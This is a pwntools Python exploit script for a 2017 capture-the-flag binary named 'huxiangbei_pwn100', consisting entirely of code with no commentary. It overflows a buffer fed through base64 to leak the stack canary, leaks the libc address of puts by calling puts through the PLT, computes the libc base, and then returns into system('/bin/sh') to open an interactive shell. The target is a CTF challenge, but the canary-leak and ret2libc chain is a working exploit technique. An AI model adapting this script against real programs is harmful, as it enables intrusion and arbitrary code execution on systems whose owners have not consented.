from pwn import *
import base64
p = process("./2017_huxiangbei_pwn100")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
elf = ELF("./2017_huxiangbei_pwn100")
def send_payload(payload):
	p.sendlineafter("give me some data[Y/N]\n","Y")
	p.sendafter("Give me some datas:\n\n",base64.b64encode(payload))
	p.recvuntil("Result is:")
	return p.recvuntil("\n",drop=True)

#gdb.attach(p)
puts_plt = elf.plt["puts"]
puts_got = elf.got["puts"]
#context.log_level = "debug"
offset = 0x10D - 0xC
payload = (offset) * "a" + "b"
info = send_payload(payload)
canary = u32(info[-3:].rjust(4,"\x00"))
log.success("canary:"+hex(canary))
payload2 = offset * "a" + p32(canary) + 0xC * "a" + p32(puts_plt) + "junk" + p32(puts_got)
send_payload(payload2)
puts_addr = u32(p.recvuntil("\n",drop=True)[:4])
log.success("puts_addr:"+hex(puts_addr))
libc.address = puts_addr - libc.symbols["puts"]
log.success("libc_base:"+hex(libc.address))
system_addr = libc.symbols["system"]
binsh = libc.search("/bin/sh").next()
payload3 = offset * "a" + p32(canary) + 0xC * "a" + p32(system_addr) + "junk" + p32(binsh)
send_payload(payload3)
p.interactive()
